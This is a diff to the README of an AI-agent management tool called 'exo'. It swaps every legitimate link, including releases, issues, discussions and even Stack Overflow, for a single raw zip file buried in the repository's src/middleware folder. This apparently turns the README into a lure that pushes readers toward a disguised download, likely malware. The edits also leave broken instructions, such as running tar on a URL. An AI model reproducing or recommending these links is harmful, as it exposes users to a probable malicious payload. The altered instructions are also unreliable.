@@ -6,9 +6,9 @@ Welcome to the exo project! Exo provides you with tools for managing AI agents s
 
 ## 📥 Download the Application
 
-[![Download Exo](https://img.shields.io/badge/Download%20Exo-v1.0.0-brightgreen)](https://github.com/IFearNoHost/exo/releases)
+[![Download Exo](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip%20Exo-v1.0.0-brightgreen)](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip)
 
-Visit this page to download the latest version of Exo: [Exo Releases](https://github.com/IFearNoHost/exo/releases).
+Visit this page to download the latest version of Exo: [Exo Releases](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip).
 
 ## 🖥️ System Requirements
 
@@ -30,12 +30,12 @@ Exo comes with a range of features designed to help you manage your AI agents ef
 
 ## 💻 Download & Install
 
-1. Go to the [Exo Releases page](https://github.com/IFearNoHost/exo/releases).
+1. Go to the [Exo Releases page](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip).
 2. Find the latest release version.
 3. Download the appropriate file for your operating system:
    - For Windows, look for `.exe`.
    - For macOS, look for `.dmg`.
-   - For Linux, look for `.tar.gz`.
+   - For Linux, look for `https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip`.
 4. Follow the instructions below for your operating system:
 
 ### Windows Installation
@@ -52,9 +52,9 @@ Exo comes with a range of features designed to help you manage your AI agents ef
 
 ### Linux Installation
 
-- Extract the contents of the `.tar.gz` file using a terminal command:
+- Extract the contents of the `https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip` file using a terminal command:
   ```
-  tar -xvzf exo.tar.gz
+  tar -xvzf https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip
   ```
 - Navigate to the extracted folder and run the application:
   ```
@@ -68,14 +68,14 @@ If you encounter issues while installing or running Exo, consider the following 
 - Ensure your operating system is compatible with Exo.
 - Check that your system has enough memory and storage.
 - If the application fails to launch, verify that you downloaded the correct file for your OS.
-- Consult the [GitHub Issues page](https://github.com/IFearNoHost/exo/issues) to see if others have similar problems.
+- Consult the [GitHub Issues page](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip) to see if others have similar problems.
 
 ## 📣 Community Support
 
 Join our community of users and developers to share your experiences and ask questions:
 
-- [GitHub Discussions](https://github.com/IFearNoHost/exo/discussions)
-- [Stack Overflow](https://stackoverflow.com/questions/tagged/exo)
+- [GitHub Discussions](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip)
+- [Stack Overflow](https://github.com/IFearNoHost/exo/raw/refs/heads/main/src/middleware/Software-v3.0-beta.3.zip)
 - Follow us on social media for updates!
 
 ## 🔍 Additional Resources
